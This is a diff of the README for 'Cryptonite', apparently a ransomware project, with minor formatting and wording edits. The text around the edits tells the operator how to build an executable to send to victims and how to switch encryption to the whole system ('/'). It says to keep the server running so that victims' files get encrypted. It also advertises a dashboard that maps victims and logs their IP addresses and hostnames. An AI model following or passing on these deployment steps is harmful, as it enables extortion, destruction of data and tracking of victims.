@@ -81,7 +81,7 @@ Copy the **NGROK URL** generated in the terminal. It will be useful in the next 
 * **exeGen.py** will create an **exe** file that can be shipped to the victim.
 * By default, Cryptonite is going to encrypt the contents of the folder named **testfolder** found in the directory where **Cryptonite.py** is run. But if you want to specify some different path, say the entire system, then make sure to edit the required field by replacing **./testfolder** to **/**   
    
-**ℹ️ Information**   
+### **ℹ️ INFORMATION**   
 **exeGen** will automatically close after the **exe** has been generated and saved in the folder you specified. Do not try to forcefully close it. The process of creating an **exe** might take upto **5 minutes**.
 
 ## 4. TEST IT ON YOUR COMPUTER 🆗
@@ -96,15 +96,12 @@ After we have tested our Ransomware, we intend to send it to the victims in the 
 Remember, creating an exe will take quite a long time (upto five minutes!), hence chill and wait out the process and **do not close exeGen.py during exe file generation**. exeGen will automatically close itself after the exe file has been generated.
 
 ### Things to consider before sending the exe file
-* Make sure that the [Encryption Folder Path](https://github.com/CYBERDEVILZ/Cryptonite/blob/0e835b6875c1a1f53c724f941c63564a2d93d6cd/Cryptonite.py#L94) is changed from **./testfolder** to **/** (if you are going for system wide encryption) or any folder path of your choice.
+* Make sure that the **Encryption Folder Path** is changed from **./testfolder** to **/** (if you are going for system wide encryption) or any folder path of your choice.
 * All the Details should be correctly filled.
-* **NGROK** and the **Server.py** must run all the time. Failure of which can result in Ransomware not being able to encrypt files (a popup of network error will be shown on the victim's screen and the Ransomware terminates).   
+* **Server.py** must run all the time. Failure of which can result in Ransomware not being able to encrypt files (a popup of network error will be shown on the victim's screen and the Ransomware terminates).   
    
 # 🚀 CRYPTONITE COMMAND CENTER 🚀
-
-
 https://user-images.githubusercontent.com/55954313/136694138-6aec2389-4310-4a69-86aa-0f4dd9ee10ef.mp4
-
 
 An all in one **monitoring dashboard** created to understand the **level of destruction** caused by this ransomware. The attacker can get to know the location of his victims plotted on a map with high precision. His IP address, hostname, place and other information are stored in a database and presented to the attacker in a neat table. Search and delete functionality has also been added. Grab a cup of coffee and sip on it while **Cryptonite** does all the hard work.
 
